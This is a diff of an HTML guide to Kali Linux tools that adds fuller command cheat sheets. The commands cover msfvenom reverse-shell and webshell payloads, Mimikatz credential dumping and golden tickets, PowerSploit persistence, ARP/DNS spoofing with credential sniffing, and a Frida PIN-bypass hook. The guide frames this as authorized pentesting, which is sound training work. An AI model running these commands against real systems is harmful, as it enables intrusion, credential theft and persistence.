+            <p class="text-block">Comprehensive vulnerability scanner:</p>
+            <pre><code># Start OpenVAS services
+gvm-start
+
+# Update feeds
+greenbone-feed-sync
+
+# Create target
+gvm-cli --gmp-username admin --gmp-password admin socket --xml "&lt;create_target&gt;&lt;name&gt;Test Target&lt;/name&gt;&lt;hosts&gt;192.168.1.100&lt;/hosts&gt;&lt;/create_target&gt;"
+
+# Create and start scan task
+gvm-cli --gmp-username admin --gmp-password admin socket --xml "&lt;create_task&gt;&lt;name&gt;Test Scan&lt;/name&gt;&lt;target id='target-id'/&gt;&lt;scanner id='scanner-id'/&gt;&lt;config id='config-id'/&gt;&lt;/create_task&gt;"
+
+# Command-line scan
+gvm-cli --gmp-username admin --gmp-password admin socket --cmd="get_reports report_id"</code></pre>
 
             <div class="tool-title"><i class="fas fa-clipboard-check"></i> 22. Lynis</div>
-            <p class="text-block">Security auditing tool for Unix/Linux.</p>
+            <p class="text-block">Security auditing tool for Unix/Linux:</p>
             <pre><code># System audit
-lynis audit system</code></pre>
+lynis audit system
+
+# Remote system audit
+lynis audit system remote 192.168.1.100
+
+# Custom profile
+lynis audit system --profile /path/to/custom.prf
+
+# Specific tests only
+lynis audit system --tests "BOOT-5122 BOOT-5155 BOOT-5177"
+
+# Generate report
+lynis audit system --report-file /tmp/lynis-report.txt
+
+# Pentest mode
+lynis audit system --pentest
+
+# Quick mode
+lynis audit system --quick</code></pre>
 
             <div class="tool-title"><i class="fas fa-spider"></i> 23. Wapiti</div>
-            <p class="text-block">Web application vulnerability scanner.</p>
+            <p class="text-block">Web application vulnerability scanner:</p>
             <pre><code># Basic scan
-wapiti -u http://target.com</code></pre>
+wapiti -u http://target.com
+
+# Scan with authentication
+wapiti -u http://target.com -a "username%password"
+
+# Specific modules
+wapiti -u http://target.com -m "sql,xss,file"
+
+# Set cookie
+wapiti -u http://target.com -c "session=abc123"
+
+# Proxy usage
+wapiti -u http://target.com -p http://127.0.0.1:8080
+
+# Output formats
+wapiti -u http://target.com -f html -o report.html
+
+# Scope limitation</code></pre>
+            <pre><code>wapiti -u http://target.com -s http://target.com/app/</code></pre>
         </section>
 
-        <!-- Section 8: Forensics -->
+        <!-- Forensics -->
         <section id="forensics">
             <h2 class="section-title">Forensics and Information Gathering Tools</h2>
 
             <div class="tool-title"><i class="fas fa-project-diagram"></i> 24. Maltego</div>
-            <p class="text-block">Visual link analysis and data mining tool.</p>
+            <p class="text-block">Visual link analysis and data mining tool:</p>
+            <pre><code># Launch Maltego
+maltego
+
+# Transform execution via command line (using CaseFile)
+casefile
+
+# Common transforms:
+# - Domain to IP
+# - Email to Person
+# - Person to Phone Number
+# - Company to Domain
+# - IP to Location
+
+# API integration for automated transforms
+# Configure in Maltego UI: Transforms -> Transform Hub</code></pre>
 
             <div class="tool-title"><i class="fas fa-satellite-dish"></i> 25. Recon-ng</div>
-            <p class="text-block">Web reconnaissance framework.</p>
+            <p class="text-block">Web reconnaissance framework:</p>
             <pre><code># Launch Recon-ng
 recon-ng
 
+# Workspace management
+workspaces create target_recon
+workspaces select target_recon
+
+# Add domains
+db insert domains domain=target.com
+
 # Module usage
-modules load recon/domains-hosts/google_site_web</code></pre>
+modules search
+modules load recon/domains-hosts/google_site_web
+options set SOURCE target.com
+run
+
+# API key management</code></pre>
+            <pre><code>keys add shodan_api XXXXXXXXXXXXXXXX
+modules load recon/hosts-ports/shodan_ip
+run
+
+# Reporting
+modules load reporting/html
+options set FILENAME /tmp/recon_report.html
+run</code></pre>
 
             <div class="tool-title"><i class="fas fa-envelope"></i> 26. theHarvester</div>
-            <p class="text-block">Email, subdomain and people names harvester.</p>
+            <p class="text-block">Email, subdomain and people names harvester:</p>
             <pre><code># Basic domain search
-theHarvester -d target.com -b google</code></pre>
+theHarvester -d target.com -b google
+
+# Multiple search engines
+theHarvester -d target.com -b google,bing,linkedin,twitter
+
+# Limit results
+theHarvester -d target.com -b all -l 500
+
+# Save results
+theHarvester -d target.com -b all -f results.html
+
+# DNS brute force
+theHarvester -d target.com -b all -c
+
+# Virtual host verification
+theHarvester -d target.com -b all -v
+
+# Shodan integration
+theHarvester -d target.com -b shodan</code></pre>
 
             <div class="tool-title"><i class="fas fa-search-location"></i> 27. Dmitry</div>
-            <p class="text-block">Deepmagic Information Gathering Tool.</p>
-            <pre><code># All modules
-dmitry -winse target.com</code></pre>
+            <p class="text-block">Deepmagic Information Gathering Tool:</p>
+            <pre><code># Basic scan
+dmitry target.com
 
-            <div class="tool-title"><i class="fas fa-magnifying-glass"></i> 28. Autopsy/Sleuth Kit</div>
-            <p class="text-block">Digital forensics platform.</p>
-            <pre><code># List partitions
+# All modules
+dmitry -winse target.com
+
+# Subdomain search
+dmitry -s target.com</code></pre>
+            <pre><code># Email search
+dmitry -e target.com
+
+# Port scan
+dmitry -p target.com
+
+# Save output
+dmitry -o output.txt target.com
+
+# Custom port range
+dmitry -p target.com -f 1 -t 1000</code></pre>
+
+            <div class="tool-title"><i class="fas fa-magnifying-glass"></i> 28. Forensics Toolkit (Autopsy/Sleuth Kit)</div>
+            <p class="text-block">Digital forensics platform:</p>
+            <pre><code># Create case
+autopsy
+
+# Command-line tools
+# List partitions
 mmls disk.img
 
+# File system analysis
+fls -r -p disk.img
+
 # Recover deleted files
-tsk_recover -e disk.img recovered_files/</code></pre>
+tsk_recover -e disk.img recovered_files/
+
+# Timeline creation
+fls -r -m "/" disk.img > timeline.body
+mactime -b timeline.body -d > timeline.csv
+
+# String search
+strings -a disk.img | grep -i password
+
+# Hash calculation
+md5sum disk.img
+sha256sum disk.img</code></pre>
         </section>
 
-        <!-- Section 9: Reverse Engineering -->
+        <!-- Reverse Engineering -->
         <section id="reverse-eng">
             <h2 class="section-title">Reverse Engineering Tools</h2>
 
             <div class="tool-title"><i class="fas fa-code"></i> 29. Ghidra</div>
-            <p class="text-block">NSA's reverse engineering framework.</p>
+            <p class="text-block">NSA's reverse engineering framework:</p>
+            <pre><code># Launch Ghidra
+ghidra
+
+# Headless analysis
+analyzeHeadless /path/to/project ProjectName -import /path/to/binary -scriptPath /path/to/scripts -postScript ScriptName.java
+
+# Common analysis tasks:
+# - Disassembly
+# - Decompilation
+# - String search
+# - Function graph
+# - Cross-references
+# - Data type management
+
+# Python scripting example
+# from ghidra.app.script import GhidraScript
+# def run():
+# function = getFunctionContaining(currentAddress)
+# print("Function: " + function.getName())</code></pre>
 
             <div class="tool-title"><i class="fas fa-laptop-code"></i> 30. Radare2</div>
-            <p class="text-block">Advanced command-line reverse engineering framework.</p>
+            <p class="text-block">Advanced command-line reverse engineering framework:</p>
             <pre><code># Open binary
 r2 binary
 
 # Analysis
 aaa
 
+# List functions
+afl
+
 # Disassemble function
-pdf @ main</code></pre>
+pdf @ main
+
+# Visual mode
+V
+
+# Debug mode</code></pre>
+            <pre><code>r2 -d binary
+
+# Web interface
+r2 -c=H binary
+
+# Search strings
+iz
+
+# Search opcodes
+/x 90909090
+
+# Cross-references
+axt @ 0x08048000
+
+# Binary patching
+wx 9090 @ 0x08048000</code></pre>
 
             <div class="tool-title"><i class="fas fa-cogs"></i> 31. GDB (with PEDA/GEF/pwndbg)</div>
-            <p class="text-block">Enhanced debugger for reverse engineering.</p>
-            <pre><code># Start GDB
+            <p class="text-block">Enhanced debugger for reverse engineering:</p>
+            <pre><code># Start GDB with PEDA
 gdb binary
 
 # Set breakpoint
-break main</code></pre>
+break main
+break *0x08048000
+
+# Run program
+run
+run $(python -c 'print "A"*100')
+
+# Examine memory
+x/10x $esp
+x/10s 0x08048000
+x/10i $eip
+
+# PEDA commands
+checksec
+pattern create 100
+pattern offset 0x41414141
+searchmem "/bin/sh"
+ropgadget
+
+# Process information
+info registers
+info proc mappings
+info functions</code></pre>
+            <pre><code># Stepping
+si # step instruction
+ni # next instruction
+continue</code></pre>
         </section>
 
-        <!-- Section 10: Exploit Dev -->
+        <!-- Exploit Dev -->
         <section id="exploit-dev">
             <h2 class="section-title">Exploitation Development Tools</h2>
 
             <div class="tool-title"><i class="fas fa-syringe"></i> 32. MSFVenom</div>
-            <p class="text-block">Payload generator and encoder.</p>
-            <pre><code># Windows reverse shell
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe</code></pre>
+            <p class="text-block">Payload generator and encoder:</p>
+            <pre><code># List payloads
+msfvenom -l payloads
+
+# Windows reverse shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > shell.exe
+
+# Linux reverse shell
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > shell.elf
+
+# PHP webshell
+msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > shell.php
+
+# Encoded payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe
+
+# Multiple formats
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f c
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f python
+
+# Bad character exclusion
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b '\x00\x0a\x0d' -f exe > clean.exe</code></pre>
 
             <div class="tool-title"><i class="fas fa-book"></i> 33. Searchsploit</div>
-            <p class="text-block">Exploit database search tool.</p>
-            <pre><code># Basic search
-searchsploit apache 2.4</code></pre>
+            <p class="text-block">Exploit database search tool:</p>
+            <pre><code># Basic search</code></pre>
+            <pre><code>searchsploit apache 2.4
+
+# Detailed search
+searchsploit -t apache | grep -i "denial"
+
+# Copy exploit to current directory
+searchsploit -m 12345
+
+# Examine exploit
+searchsploit -x 12345
+
+# Update database
+searchsploit -u
+
+# Case sensitive search
+searchsploit -s Apache
+
+# Exclude terms
+searchsploit apache --exclude="php"
+
+# JSON output
+searchsploit --json apache > results.json</code></pre>
 
             <div class="tool-title"><i class="fas fa-puzzle-piece"></i> 34. Pattern Create/Offset</div>
-            <p class="text-block">Buffer overflow development tools.</p>
+            <p class="text-block">Buffer overflow development tools:</p>
             <pre><code># Create pattern
 pattern_create -l 1000
 
+# MSF pattern create
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
+
 # Find offset
-pattern_offset -q 0x41396141</code></pre>
+pattern_offset -q 0x41396141
+
+# MSF pattern offset
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x41396141
+
+# Alternative with Python
+python -c "print('A' * 100 + 'B' * 4 + 'C' * 200)"
+
+# Cyclic pattern with pwntools
+python3 -c "from pwn import *; print(cyclic(1000))"
+python3 -c "from pwn import *; print(cyclic_find(0x61616174))"</code></pre>
         </section>
 
-        <!-- Section 11: MITM -->
+        <!-- MITM -->
         <section id="mitm">
             <h2 class="section-title">Network Spoofing and MITM Tools</h2>
 
             <div class="tool-title"><i class="fas fa-exchange-alt"></i> 35. Ettercap</div>
-            <p class="text-block">Comprehensive suite for MITM attacks.</p>
-            <pre><code># Text interface
-ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//</code></pre>
+            <p class="text-block">Comprehensive suite for MITM attacks:</p>
+            <pre><code># Graphical interface
+ettercap -G
+
+# Text interface
+ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//
+
+# Sniff all traffic
+ettercap -T -M arp:remote ///
+
+# Plugin usage
+ettercap -T -P dns_spoof -M arp:remote /192.168.1.1// /192.168.1.100//
+
+# Passive scanning
+ettercap -T -p
+
+# Filter usage
+etterfilter filter.ef -o filter.ef
+ettercap -T -F filter.ef -M arp:remote ///
+
+# Log traffic
+ettercap -T -L logfile -M arp:remote ///</code></pre>
 
             <div class="tool-title"><i class="fas fa-network-info"></i> 36. Bettercap</div>
-            <p class="text-block">Modern MITM framework.</p>
-            <pre><code># ARP spoofing
+            <p class="text-block">Modern MITM framework:</p>
+            <pre><code># Interactive mode
+bettercap
+
+# Network recon
+net.probe on
+net.show
+
+# ARP spoofing
 set arp.spoof.targets 192.168.1.100
-arp.spoof on</code></pre>
+arp.spoof on
+
+# DNS spoofing
+set dns.spoof.domains *.target.com
+set dns.spoof.address 192.168.1.200
+dns.spoof on</code></pre>
+            <pre><code># HTTP/HTTPS proxy
+set http.proxy.sslstrip true
+http.proxy on
+
+# Capture credentials
+set net.sniff.regexp '.*password=.+'
+net.sniff on
+
+# WiFi attacks
+wifi.recon on
+wifi.show
+wifi.deauth 00:11:22:33:44:55</code></pre>
 
             <div class="tool-title"><i class="fas fa-comment-dots"></i> 37. Responder</div>
-            <p class="text-block">LLMNR, NBT-NS and MDNS poisoner.</p>
+            <p class="text-block">LLMNR, NBT-NS and MDNS poisoner:</p>
             <pre><code># Basic usage
-responder -I eth0</code></pre>
+responder -I eth0
+
+# Force WPAD authentication
+responder -I eth0 -wF
+
+# Specific protocols
+responder -I eth0 --lm --disable-ess
+
+# Analyze mode
+responder -I eth0 -A
+
+# Verbose mode
+responder -I eth0 -v
+
+# Custom challenge
+responder -I eth0 --lm-challenge 1122334455667788
+
+# Fingerprint mode
+responder -I eth0 -f</code></pre>
         </section>
 
-        <!-- Section 12: Mobile Security -->
+        <!-- Mobile Security -->
         <section id="mobile-security">
             <h2 class="section-title">Mobile Security Testing Tools</h2>
 
             <div class="tool-title"><i class="fab fa-android"></i> 38. Android Debug Bridge (ADB)</div>
-            <p class="text-block">Android device interaction tool.</p>
+            <p class="text-block">Android device interaction tool:</p>
             <pre><code># List devices
 adb devices
 
 # Shell access
-adb shell</code></pre>
+adb shell
+
+# Install APK
+adb install app.apk
+
+# Pull files
+adb pull /data/data/com.app/databases/app.db
+
+# Push files
+adb push file.txt /sdcard/
+
+# Logcat
+adb logcat | grep -i password
+
+# Screen capture
+adb shell screencap /sdcard/screen.png
+
+# Package management
+adb shell pm list packages
+adb shell pm path com.example.app
+
+# Activity manager
+adb shell am start -n com.example.app/.MainActivity</code></pre>
 
             <div class="tool-title"><i class="fas fa-mobile-alt"></i> 39. MobSF (Mobile Security Framework)</div>
-            <p class="text-block">Automated mobile app security testing.</p>
+            <p class="text-block">Automated mobile app security testing:</p>
+            <pre><code># Start MobSF
+mobsf
+
+# API usage for automation
+# Upload APK
+curl -F "file=@app.apk" http://localhost:8000/api/v1/upload -H "Authorization: API_KEY"
+
+# Scan</code></pre>
+            <pre><code>curl -X POST http://localhost:8000/api/v1/scan -H "Authorization: API_KEY" -d "hash=file_hash"
+
+# Get report
+curl http://localhost:8000/api/v1/report_json?hash=file_hash -H "Authorization: API_KEY"
+
+# Dynamic analysis
+# Configure with Genymotion/Android Studio emulator</code></pre>
 
             <div class="tool-title"><i class="fas fa-wrench"></i> 40. Frida</div>
-            <p class="text-block">Dynamic instrumentation toolkit.</p>
-            <pre><code># Attach to process
-frida -U com.example.app</code></pre>
+            <p class="text-block">Dynamic instrumentation toolkit:</p>
+            <pre><code># List processes
+frida-ps -U
+
+# Attach to process
+frida -U com.example.app
+
+# Run script
+frida -U -l script.js com.example.app
+
+# Basic hooking script
+Java.perform(function() {
+var MainActivity = Java.use('com.example.app.MainActivity');
+MainActivity.checkPin.implementation = function(pin) {
+console.log('PIN: ' + pin);
+return true;
+};
+});
+
+# Spawn and attach
+frida -U -f com.example.app -l script.js --no-pause
+
+# Trace API calls
+frida-trace -U -i "open*" com.example.app</code></pre>
         </section>
 
-        <!-- Section 13: Cryptography -->
+        <!-- Cryptography -->
         <section id="crypto">
             <h2 class="section-title">Cryptography and Steganography Tools</h2>
 
             <div class="tool-title"><i class="fas fa-hashtag"></i> 41. Hashidentifier</div>
-            <p class="text-block">Hash type identification tool.</p>
+            <p class="text-block">Hash type identification tool:</p>
+            <pre><code># Interactive mode</code></pre>
+            <pre><code>hash-identifier
+
+# Examples:
+# MD5: 32 characters (128 bits)
+# SHA-1: 40 characters (160 bits)
+# SHA-256: 64 characters (256 bits)
+# SHA-512: 128 characters (512 bits)
+
+# Common hash identification
+echo "5d41402abc4b2a76b9719d911017c592" | hash-identifier</code></pre>
 
             <div class="tool-title"><i class="fas fa-image"></i> 42. Steghide</div>
-            <p class="text-block">Steganography tool for hiding data.</p>
+            <p class="text-block">Steganography tool for hiding data:</p>
             <pre><code># Embed file
-steghide embed -cf image.jpg -ef secret.txt -p password</code></pre>
+steghide embed -cf image.jpg -ef secret.txt -p password
+
+# Extract file
+steghide extract -sf image.jpg -p password
+
+# Get info
+steghide info image.jpg
+
+# Brute force with stegcracker
+stegcracker image.jpg /usr/share/wordlists/rockyou.txt
+
+# Check capacity
+steghide info image.jpg</code></pre>
 
             <div class="tool-title"><i class="fas fa-box-open"></i> 43. Binwalk</div>
-            <p class="text-block">Firmware analysis and extraction tool.</p>
+            <p class="text-block">Firmware analysis and extraction tool:</p>
             <pre><code># Scan for embedded files
 binwalk firmware.bin
 
 # Extract files
-binwalk -e firmware.bin</code></pre>
+binwalk -e firmware.bin
+
+# Entropy analysis
+binwalk -E firmware.bin
+
+# Custom signatures
+binwalk -m custom.sig firmware.bin</code></pre>
+            <pre><code># Recursive extraction
+binwalk -Me firmware.bin
+
+# Hexdump
+binwalk -W firmware.bin</code></pre>
         </section>
 
-        <!-- Section 14: Post-Exploitation -->
+        <!-- Post-Exploitation -->
         <section id="post-exploit">
             <h2 class="section-title">Post-Exploitation Tools</h2>
 
             <div class="tool-title"><i class="fas fa-user-ninja"></i> 44. Mimikatz</div>
-            <p class="text-block">Windows credential extraction tool.</p>
-            <pre><code># Standalone usage
+            <p class="text-block">Windows credential extraction tool:</p>
+            <pre><code># Basic usage (from Meterpreter)
+load mimikatz
+mimikatz_command -f sekurlsa::logonPasswords
+
+# Standalone usage
 mimikatz.exe
 privilege::debug
-sekurlsa::logonpasswords</code></pre>
+sekurlsa::logonpasswords
+lsadump::sam
+lsadump::secrets
+
+# Pass the hash
+sekurlsa::pth /user:Administrator /domain:target.local /ntlm:hash
+
+# Golden ticket
+kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:hash
+
+# DCSync
+lsadump::dcsync /domain:target.local /user:Administrator</code></pre>
 
             <div class="tool-title"><i class="fab fa-windows"></i> 45. PowerSploit</div>
-            <p class="text-block">PowerShell post-exploitation framework.</p>
+            <p class="text-block">PowerShell post-exploitation framework:</p>
+            <pre><code># Import module
+Import-Module PowerSploit.psd1
+
+# Invoke-Mimikatz
+Invoke-Mimikatz -DumpCreds
+
+# PowerUp (privilege escalation)
+Invoke-AllChecks</code></pre>
+            <pre><code># PowerView (AD enumeration)
+Get-NetDomain
+Get-NetUser
+Get-NetGroup
+Get-NetComputer
+
+# Invoke-TokenManipulation
+Invoke-TokenManipulation -Enumerate
+Invoke-TokenManipulation -ImpersonateUser -Username "DOMAIN\Administrator"
+
+# Persistence
+Invoke-EventLogBackdoor
+Invoke-ServicePersistence</code></pre>
 
             <div class="tool-title"><i class="fas fa-terminal"></i> 46. Evil-WinRM</div>
-            <p class="text-block">Windows Remote Management shell.</p>
+            <p class="text-block">Windows Remote Management shell:</p>
             <pre><code># Basic connection
-evil-winrm -i 192.168.1.100 -u Administrator -p password</code></pre>
+evil-winrm -i 192.168.1.100 -u Administrator -p password
+
+# Pass the hash
+evil-winrm -i 192.168.1.100 -u Administrator -H ntlm_hash
+
+# SSL connection
+evil-winrm -i 192.168.1.100 -u Administrator -p password -S
+
+# Upload/Download files
+upload local_file.txt C:\Windows\Temp\file.txt
+download C:\Users\Administrator\Desktop\passwords.txt /tmp/pass.txt
+
+# Load PowerShell scripts
+menu
+Bypass-4MSI</code></pre>
         </section>
 
-        <!-- Section 15: Reporting -->
+        <!-- Reporting -->
         <section id="reporting">
             <h2 class="section-title">Reporting and Documentation Tools</h2>
 
             <div class="tool-title"><i class="fas fa-file-medical-alt"></i> 47. Dradis</div>
-            <p class="text-block">Collaboration and reporting framework.</p>
+            <p class="text-block">Collaboration and reporting framework:</p>
+            <pre><code># Start Dradis
+service dradis start</code></pre>
+            <pre><code># Access web interface
+# http://localhost:3000
+
+# Import findings
+# Supports: Nmap, Burp, Nessus, Qualys, etc.
+
+# API usage
+curl -u user:password http://localhost:3000/api/nodes
+
+# Export reports
+# Formats: Word, Excel, PDF, HTML</code></pre>
 
             <div class="tool-title"><i class="fas fa-laptop-house"></i> 48. Faraday</div>
-            <p class="text-block">Collaborative penetration test IDE.</p>
+            <p class="text-block">Collaborative penetration test IDE:</p>
+            <pre><code># Start Faraday
+faraday-server
+faraday-client
+
+# Import tool outputs
+# Automatic detection and parsing
+
+# API examples
+curl -X GET http://localhost:5985/v2/ws/
+curl -X POST http://localhost:5985/v2/ws/workspace_name/hosts/
+
+# Plugin usage
+# Supports 80+ security tools</code></pre>
 
             <div class="tool-title"><i class="fas fa-tree"></i> 49. CherryTree</div>
-            <p class="text-block">Hierarchical note-taking application.</p>
+            <p class="text-block">Hierarchical note-taking application:</p>
+            <pre><code># Launch CherryTree
+cherrytree
+
+# Features:
+# - Syntax highlighting
+# - Rich text formatting
+# - Image embedding
+# - Code execution
+# - Encryption support
+# - Import/Export capabilities
+
+# Command line</code></pre>
+            <pre><code>cherrytree --filepath=/path/to/notes.ctb</code></pre>
 
             <div class="tool-title"><i class="fas fa-chart-bar"></i> 50. Pipal</div>
-            <p class="text-block">Password analysis tool.</p>
+            <p class="text-block">Password analysis tool:</p>
             <pre><code># Basic analysis
-pipal passwords.txt</code></pre>
+pipal passwords.txt
+
+# Output to file
+pipal passwords.txt > analysis.txt
+
+# Common analysis results:
+# - Top passwords
+# - Character sets
+# - Password lengths
+# - Common patterns
+# - Keyboard patterns
+# - Date patterns
+
+# Custom checks
+pipal --plugin custom.rb passwords.txt</code></pre>
         </section>
 
-        <!-- Section 16: Best Practices -->
-        <section id="best-practices">
-            <h2 class="section-title">Best Practices & Legal Considerations</h2>
-            
-            <div class="alert-info-custom">
-                <h4><i class="fas fa-gavel"></i> Ethical Usage Framework</h4>
-                <p>Using Kali Linux tools requires strict adherence to legal and ethical guidelines:</p>
-                <ul>
-                    <li><strong>Always Obtain Written Authorization:</strong> Never test systems without explicit permission. Define clear scope and boundaries.</li>
-                    <li><strong>Maintain Professional Standards:</strong> Document all activities thoroughly. Protect client confidentiality.</li>
-                    <li><strong>Minimize System Impact:</strong> Avoid denial-of-service conditions. Test during agreed maintenance windows.</li>
-                </ul>
-            </div>
+        <!-- Advanced Integration -->
+        <section id="advanced-integration">
+            <h2 class="section-title">Advanced Tool Integration and Automation</h2>
+            <h3 class="tool-title">Combining Tools for Comprehensive Assessments</h3>
+            <p class="text-block">Professional penetration testing requires seamless integration of multiple tools:</p>
+            <pre><code>#!/bin/bash
+# Automated reconnaissance and vulnerability assessment
 
-            <p class="text-block">Mastery of these tools requires not just technical knowledge but also understanding of their appropriate application, legal implications, and integration possibilities. Continuous learning, hands-on practice, and staying informed about emerging threats and techniques will ensure these powerful tools are used to strengthen security rather than compromise it.</p>
+TARGET="$1"
+OUTPUT_DIR="./assessment_$(date +%Y%m%d_%H%M%S)"
+mkdir -p "$OUTPUT_DIR"
+
+echo "[*] Starting comprehensive assessment of $TARGET"
+
+# Network reconnaissance
+echo "[*] Running Nmap scan..."
+nmap -sV -sC -O -A -T4 -oA "$OUTPUT_DIR/nmap_scan" "$TARGET"
+
+# Extract open ports
+PORTS=$(grep -oP '\d+/open' "$OUTPUT_DIR/nmap_scan.gnmap" | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')</code></pre>
+            <pre><code># Web application scanning
+if echo "$PORTS" | grep -q "80\|443\|8080\|8443"; then
+echo "[*] Web services detected. Running Nikto..."
+nikto -h "http://$TARGET" -o "$OUTPUT_DIR/nikto_scan.txt"
+
+echo "[*] Running Dirb..."
+dirb "http://$TARGET" -o "$OUTPUT_DIR/dirb_scan.txt"
+
+echo "[*] Running WPScan if WordPress detected..."
+wpscan --url "http://$TARGET" --enumerate ap,at,cb,dbe -o "$OUTPUT_DIR/wpscan.txt"
+fi
+
+# Vulnerability scanning
+echo "[*] Running vulnerability assessment..."
+nmap --script vuln -p"$PORTS" "$TARGET" -oA "$OUTPUT_DIR/nmap_vuln_scan"
+
+# Generate report
+echo "[*] Generating preliminary report..."
+cat > "$OUTPUT_DIR/preliminary_report.md" << EOF
+# Security Assessment Report
+Target: $TARGET
+Date: $(date)
+
+## Network Services
+ $(cat "$OUTPUT_DIR/nmap_scan.nmap" | grep -E "^\d+/tcp|^\d+/udp")
+
+## Potential Vulnerabilities
+ $(grep -h "VULNERABLE" "$OUTPUT_DIR"/*.txt 2>/dev/null || echo "No automatic vulnerabilities detected")
+
+## Recommendations
+- Review all identified services
+- Investigate potential vulnerabilities manually
+- Perform authenticated testing where applicable
+EOF
+
+echo "[*] Assessment complete. Results saved to $OUTPUT_DIR"</code></pre>
+
+            <h3 class="tool-title">Custom Tool Development</h3>
+            <p class="text-block">Creating custom tools for specific testing scenarios:</p>
+            <pre><code>#!/usr/bin/env python3
+# Custom security assessment tool
+
+import subprocess</code></pre>
+            <pre><code>import json
+import argparse
+from datetime import datetime
+
+class SecurityAssessor:
+def __init__(self, target):
+self.target = target
+self.results = {
+'target': target,
+'timestamp': datetime.now().isoformat(),
+'findings': []
+}
+
+def run_nmap(self):
+"""Run Nmap scan and parse results"""
+print(f"[*] Scanning {self.target} with Nmap...")
+cmd = ['nmap', '-sV', '-sC', '-oX', '-', self.target]
+result = subprocess.run(cmd, capture_output=True, text=True)
+# Parse XML output and extract findings
+return result.stdout
+
+def check_ssl(self):
+"""Check SSL/TLS configuration"""
+print(f"[*] Checking SSL/TLS configuration...")
+cmd = ['sslscan', '--no-colour', self.target]
+result = subprocess.run(cmd, capture_output=True, text=True)
+# Parse and analyze SSL findings
+return result.stdout
+
+def generate_report(self):
+"""Generate JSON report"""
+with open(f'assessment_{self.target.replace(".", "_")}.json', 'w') as f:
+json.dump(self.results, f, indent=2)
+
+if __name__ == '__main__':
+parser = argparse.ArgumentParser(description='Custom Security Assessment Tool')
+parser.add_argument('target', help='Target IP or hostname')
+args = parser.parse_args()
+
+assessor = SecurityAssessor(args.target)
+assessor.run_nmap()
+assessor.check_ssl()
+assessor.generate_report()</code></pre>
+        </section>
+
+        <!-- Best Practices -->
+        <section id="best-practices">
+            <h2 class="section-title">Best Practices for Kali Linux Tool Usage</h2>
+            
+            <h3 class="tool-title">Legal and Ethical Considerations</h3>
+            <p class="text-block">Using Kali Linux tools requires strict adherence to legal and ethical guidelines:</p>
+            <pre class="ascii-art">┌─────────────────────────────────────────────────────────────┐
+│ Ethical Usage Framework │
+└─────────────────────────────────────────────────────────────┘
+│
+┌─────────────────────┼─────────────────────┐
+▼ ▼ ▼
+┌────────────────┐ ┌────────────────┐ ┌────────────────┐
+│ Authorization │ │ Scope │ │ Documentation │
+│ Required │ │ Definition │ │ Mandatory │
+└────────────────┘ └────────────────┘ └────────────────┘
+│
+┌─────────────────────────────────────────────────────────────┐
+│ Professional Standards │
+└─────────────────────────────────────────────────────────────┘</pre>
+            <p class="text-block">1. Always Obtain Written Authorization<br>○ Never test systems without explicit permission<br>○ Define clear scope and boundaries<br>○ Understand local and international laws</p>
+            <p class="text-block">2. Maintain Professional Standards<br>○ Document all activities thoroughly<br>○ Protect client confidentiality<br>○ Report findings responsibly</p>
+            <p class="text-block">3. Minimize System Impact<br>○ Avoid denial-of-service conditions<br>○ Test during agreed maintenance windows<br>○ Have rollback plans ready</p>
+
+            <h3 class="tool-title">Tool Selection Strategy</h3>
+            <p class="text-block">Choosing the right tool for specific tasks:</p>
+            <p class="text-block">1. Reconnaissance Phase<br>○ Passive: Maltego, theHarvester, Recon-ng<br>○ Active: Nmap, Masscan, Dmitry</p>
+            <p class="text-block">2. Vulnerability Assessment<br>○ Network: OpenVAS, Nessus (commercial)<br>○ Web: Burp Suite, OWASP ZAP, Nikto<br>○ System: Lynis, Wapiti</p>
+            <p class="text-block">3. Exploitation<br>○ Framework: Metasploit, BeEF<br>○ Manual: SearchSploit, custom exploits<br>○ Social: SET, Gophish</p>
+            <p class="text-block">4. Post-Exploitation<br>○ Windows: Mimikatz, PowerSploit<br>○ Linux: LinEnum, LinPEAS<br>○ Persistence: Empire, Covenant</p>
+            <p class="text-block">5. Reporting<br>○ Collaboration: Dradis, Faraday<br>○ Documentation: CherryTree, Screenshots<br>○ Analysis: Pipal, custom scripts</p>
+        </section>
+
+        <!-- Conclusion -->
+        <section id="conclusion">
+            <h2 class="section-title">Conclusion</h2>
+            <p class="text-block">The Kali Linux toolkit represents an extensive collection of specialized security tools that enable professionals to conduct thorough security assessments across diverse environments. From the versatility of Nmap for network reconnaissance to the comprehensive capabilities of Metasploit for exploitation, each tool serves specific purposes within the security testing lifecycle.</p>
+            <p class="text-block">Mastery of these tools requires not just technical knowledge but also understanding of their appropriate application, legal implications, and integration possibilities. The 50 tools covered in this guide form the core arsenal for security professionals, but true expertise comes from knowing when and how to apply each tool effectively.</p>
+            <p class="text-block">As the security landscape continues to evolve, these tools are regularly updated and new tools emerge. Staying current with tool capabilities, practicing in legal environments, and maintaining ethical standards are essential for professional growth in cybersecurity. The combination of technical proficiency, methodical approach, and ethical practice distinguishes professional security assessments from malicious activities.</p>
+            <p class="text-block">Remember that tools are only as effective as the professionals using them. Continuous learning, hands-on practice, and staying informed about emerging threats and techniques will ensure these powerful tools are used to strengthen security rather than compromise it.</p>
+        </section>
+
+        <!-- FAQ -->
+        <section id="faq">
+            <h2 class="section-title">Frequently Asked Questions</h2>
+            <div class="tool-title">Which Kali Linux tools should beginners focus on first?</div>
+            <p class="text-block">For beginners entering the cybersecurity field, focusing on foundational tools provides the best learning path:</p>
+            <p class="text-block">1. Start with Network Basics:</p>
